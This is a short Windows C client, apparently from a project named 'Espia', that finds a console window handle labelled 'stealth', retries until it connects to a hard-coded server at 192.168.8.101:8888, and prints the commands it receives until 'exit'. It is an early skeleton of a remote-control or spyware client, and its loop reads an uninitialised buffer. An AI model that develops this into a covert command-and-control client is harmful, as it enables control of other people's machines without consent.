#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h> 
#include <stdio.h>
#include "Espia/includes/espia.h"

#define TRY_SERVER 5

int main() {
	HWND stealth;           //Declare a window handle 
	AllocConsole();			//Allocate a new console
	stealth = FindWindowA("ConsoleWindowClass", NULL); //Find the previous Window handler and hide/show the window depending upon the next command
	ShowWindow(stealth, SW_NORMAL);

	WORD server_status;
	SOCKET connection;
	while ((server_status = espia_connect("192.168.8.101", "8888", &connection)) == CONNECTION_FAIL)
		Sleep(TRY_SERVER);

    CHAR buff[256];
    int cmd_size;
    while (strcmp(buff, "exit")) {
        memset(buff, 0, 256);
        cmd_size = espia_recv(&connection, buff, 256);
        memset(buff + cmd_size - 1, 0, 1);
        printf("Server>> %s | Size (%d)\n", buff, cmd_size);
    }

	espia_disconnect(&connection);

	return 0;
}